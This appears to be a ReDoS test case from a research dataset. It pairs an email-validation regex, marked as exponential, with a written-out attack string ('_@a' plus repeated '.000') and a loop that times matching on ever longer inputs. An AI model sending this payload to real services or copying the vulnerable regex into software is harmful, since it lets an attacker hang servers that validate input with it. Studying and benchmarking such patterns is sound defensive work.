/* 1533
 * ^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9]+(-?[a-z0-9]+)?(\.[a-z0-9]+(-?[a-z0-9]+)?)*\.([a-z]{2}|xn\-{2}[a-z0-9]{4,18}|arpa|aero|asia|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|xxx)$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"_@a"+".000"*16+"!1 __EOA(i or ii)"
 */
var REGEX = /^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9]+(-?[a-z0-9]+)?(\.[a-z0-9]+(-?[a-z0-9]+)?)*\.([a-z]{2}|xn\-{2}[a-z0-9]{4,18}|arpa|aero|asia|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|xxx)$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '_@a' + '.000'.repeat(i*1) + '!1 __EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}